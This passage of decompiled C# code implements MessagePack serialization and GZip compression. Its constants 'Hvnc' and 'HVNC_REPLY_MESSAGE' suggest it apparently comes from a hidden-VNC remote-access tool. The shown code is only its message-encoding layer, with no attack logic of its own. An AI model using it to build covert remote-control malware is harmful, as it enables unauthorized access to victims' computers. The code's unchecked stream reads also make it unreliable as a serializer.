				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt16(array, 0);
				Clear();
				valueType = MsgPackType.Map;
				for (num2 = 0; num2 < num; num2++)
				{
					MsgPack msgPack2 = InnerAdd();
					msgPack2.SetName(ReadTools.ReadString(ms));
					msgPack2.DecodeFromStream(ms);
				}
				return;
			}
			switch (b)
			{
			case 222:
				array = new byte[2];
				ms.Read(array, 0, 2);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt16(array, 0);
				Clear();
				valueType = MsgPackType.Map;
				for (num2 = 0; num2 < num; num2++)
				{
					MsgPack msgPack4 = InnerAdd();
					msgPack4.SetName(ReadTools.ReadString(ms));
					msgPack4.DecodeFromStream(ms);
				}
				break;
			case 223:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				num = BitConverter.ToInt32(array, 0);
				Clear();
				valueType = MsgPackType.Map;
				for (num2 = 0; num2 < num; num2++)
				{
					MsgPack msgPack3 = InnerAdd();
					msgPack3.SetName(ReadTools.ReadString(ms));
					msgPack3.DecodeFromStream(ms);
				}
				break;
			case 218:
				SetAsString(ReadTools.ReadString(b, ms));
				break;
			case 219:
				SetAsString(ReadTools.ReadString(b, ms));
				break;
			case 208:
				SetAsInteger((sbyte)ms.ReadByte());
				break;
			case 209:
				array = new byte[2];
				ms.Read(array, 0, 2);
				array = BytesTools.SwapBytes(array);
				SetAsInteger(BitConverter.ToInt16(array, 0));
				break;
			case 210:
				array = new byte[4];
				ms.Read(array, 0, 4);
				array = BytesTools.SwapBytes(array);
				SetAsInteger(BitConverter.ToInt32(array, 0));
				break;
			case 211:
				array = new byte[8];
				ms.Read(array, 0, 8);
				array = BytesTools.SwapBytes(array);
				SetAsInteger(BitConverter.ToInt64(array, 0));
				break;
			}
		}

		public byte[] Encode2Bytes()
		{
			using MemoryStream memoryStream = new MemoryStream();
			Encode2Stream(memoryStream);
			byte[] array = new byte[memoryStream.Length];
			memoryStream.Position = 0L;
			memoryStream.Read(array, 0, (int)memoryStream.Length);
			return Zip.Compress(array);
		}

		public void Encode2Stream(Stream ms)
		{
			switch (valueType)
			{
			case MsgPackType.Unknown:
			case MsgPackType.Null:
				WriteTools.WriteNull(ms);
				break;
			case MsgPackType.String:
				WriteTools.WriteString(ms, (string)innerValue);
				break;
			case MsgPackType.Integer:
				WriteTools.WriteInteger(ms, (long)innerValue);
				break;
			case MsgPackType.UInt64:
				WriteTools.WriteUInt64(ms, (ulong)innerValue);
				break;
			case MsgPackType.Boolean:
				WriteTools.WriteBoolean(ms, (bool)innerValue);
				break;
			case MsgPackType.Float:
				WriteTools.WriteFloat(ms, (double)innerValue);
				break;
			case MsgPackType.Single:
				WriteTools.WriteFloat(ms, (float)innerValue);
				break;
			case MsgPackType.DateTime:
				WriteTools.WriteInteger(ms, GetAsInteger());
				break;
			case MsgPackType.Binary:
				WriteTools.WriteBinary(ms, (byte[])innerValue);
				break;
			case MsgPackType.Map:
				WriteMap(ms);
				break;
			case MsgPackType.Array:
				WirteArray(ms);
				break;
			default:
				WriteTools.WriteNull(ms);
				break;
			}
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			return new MsgPackEnum(children);
		}
	}
	public enum MsgPackType
	{
		Unknown,
		Null,
		Map,
		Array,
		String,
		Integer,
		UInt64,
		Boolean,
		Float,
		Single,
		DateTime,
		Binary
	}
	public class ClientType
	{
		public const string Normal = "Normal";

		public const string Hvnc = "Hvnc";
	}
	public class PacketTypes
	{
		public const string HVNC_REPLY_MESSAGE = "HVNC_REPLY_MESSAGE";

		public const string HVNC_REPLY_BMP = "HVNC_REPLY_CMP";
	}
	internal class ReadTools
	{
		public static string ReadString(Stream ms, int len)
		{
			byte[] array = new byte[len];
			ms.Read(array, 0, len);
			return BytesTools.GetString(array);
		}

		public static string ReadString(Stream ms)
		{
			return ReadString((byte)ms.ReadByte(), ms);
		}

		public static string ReadString(byte strFlag, Stream ms)
		{
			byte[] array = null;
			int num = 0;
			if (strFlag >= 160 && strFlag <= 191)
			{
				num = strFlag - 160;
			}
			else
			{
				switch (strFlag)
				{
				case 217:
					num = ms.ReadByte();
					break;
				case 218:
					array = new byte[2];
					ms.Read(array, 0, 2);
					array = BytesTools.SwapBytes(array);
					num = BitConverter.ToUInt16(array, 0);
					break;
				case 219:
					array = new byte[4];
					ms.Read(array, 0, 4);
					array = BytesTools.SwapBytes(array);
					num = BitConverter.ToInt32(array, 0);
					break;
				}
			}
			array = new byte[num];
			ms.Read(array, 0, num);
			return BytesTools.GetString(array);
		}
	}
	internal class WriteTools
	{
		public static void WriteNull(Stream ms)
		{
			ms.WriteByte(192);
		}

		public static void WriteString(Stream ms, string strVal)
		{
			byte[] utf8Bytes = BytesTools.GetUtf8Bytes(strVal);
			byte[] array = null;
			int num = utf8Bytes.Length;
			byte b = 0;
			if (num <= 31)
			{
				b = (byte)(160 + (byte)num);
				ms.WriteByte(b);
			}
			else if (num <= 255)
			{
				b = 217;
				ms.WriteByte(b);
				b = (byte)num;
				ms.WriteByte(b);
			}
			else if (num <= 65535)
			{
				b = 218;
				ms.WriteByte(b);
				array = BytesTools.SwapBytes(BitConverter.GetBytes((short)num));
				ms.Write(array, 0, array.Length);
			}
			else
			{
				b = 219;
				ms.WriteByte(b);
				array = BytesTools.SwapBytes(BitConverter.GetBytes(num));
				ms.Write(array, 0, array.Length);
			}
			ms.Write(utf8Bytes, 0, utf8Bytes.Length);
		}

		public static void WriteBinary(Stream ms, byte[] rawBytes)
		{
			byte[] array = null;
			int num = rawBytes.Length;
			byte b = 0;
			if (num <= 255)
			{
				b = 196;
				ms.WriteByte(b);
				b = (byte)num;
				ms.WriteByte(b);
			}
			else if (num <= 65535)
			{
				b = 197;
				ms.WriteByte(b);
				array = BytesTools.SwapBytes(BitConverter.GetBytes((short)num));
				ms.Write(array, 0, array.Length);
			}
			else
			{
				b = 198;
				ms.WriteByte(b);
				array = BytesTools.SwapBytes(BitConverter.GetBytes(num));
				ms.Write(array, 0, array.Length);
			}
			ms.Write(rawBytes, 0, rawBytes.Length);
		}

		public static void WriteFloat(Stream ms, double fVal)
		{
			ms.WriteByte(203);
			ms.Write(BytesTools.SwapDouble(fVal), 0, 8);
		}

		public static void WriteSingle(Stream ms, float fVal)
		{
			ms.WriteByte(202);
			ms.Write(BytesTools.SwapBytes(BitConverter.GetBytes(fVal)), 0, 4);
		}

		public static void WriteBoolean(Stream ms, bool bVal)
		{
			if (bVal)
			{
				ms.WriteByte(195);
			}
			else
			{
				ms.WriteByte(194);
			}
		}

		public static void WriteUInt64(Stream ms, ulong iVal)
		{
			ms.WriteByte(207);
			byte[] bytes = BitConverter.GetBytes(iVal);
			ms.Write(BytesTools.SwapBytes(bytes), 0, 8);
		}

		public static void WriteInteger(Stream ms, long iVal)
		{
			if (iVal >= 0)
			{
				if (iVal <= 127)
				{
					ms.WriteByte((byte)iVal);
				}
				else if (iVal <= 255)
				{
					ms.WriteByte(204);
					ms.WriteByte((byte)iVal);
				}
				else if (iVal <= 65535)
				{
					ms.WriteByte(205);
					ms.Write(BytesTools.SwapInt16((short)iVal), 0, 2);
				}
				else if (iVal <= uint.MaxValue)
				{
					ms.WriteByte(206);
					ms.Write(BytesTools.SwapInt32((int)iVal), 0, 4);
				}
				else
				{
					ms.WriteByte(211);
					ms.Write(BytesTools.SwapInt64(iVal), 0, 8);
				}
			}
			else if (iVal <= int.MinValue)
			{
				ms.WriteByte(211);
				ms.Write(BytesTools.SwapInt64(iVal), 0, 8);
			}
			else if (iVal <= -32768)
			{
				ms.WriteByte(210);
				ms.Write(BytesTools.SwapInt32((int)iVal), 0, 4);
			}
			else if (iVal <= -128)
			{
				ms.WriteByte(209);
				ms.Write(BytesTools.SwapInt16((short)iVal), 0, 2);
			}
			else if (iVal <= -32)
			{
				ms.WriteByte(208);
				ms.WriteByte((byte)iVal);
			}
			else
			{
				ms.WriteByte((byte)iVal);
			}
		}
	}
	public static class Zip
	{
		public static byte[] Decompress(byte[] input)
		{
			using MemoryStream memoryStream = new MemoryStream(input);
			byte[] array = new byte[4];
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array2 = new byte[num];
			gZipStream.Read(array2, 0, num);
			return array2;
		}

		public static byte[] Compress(byte[] input)
		{
			using MemoryStream memoryStream = new MemoryStream();
			byte[] bytes = BitConverter.GetBytes(input.Length);
			memoryStream.Write(bytes, 0, 4);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress))
			{
				gZipStream.Write(input, 0, input.Length);
				gZipStream.Flush();
			}
			return memoryStream.ToArray();
		}
	}
}
[CompilerGenerated]
internal sealed class MessagePackLib.<PrivateImplementationDetails>
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 6)]
	private struct __StaticArrayInitTypeSize=6
	{
	}

	internal static readonly __StaticArrayInitTypeSize=6 87639126EA77B358F26532367DBA67C5310EF50A8D9888ED070CD40E1F605A8F/* Not supported: data(2E 00 2F 00 5C 00) */;
}
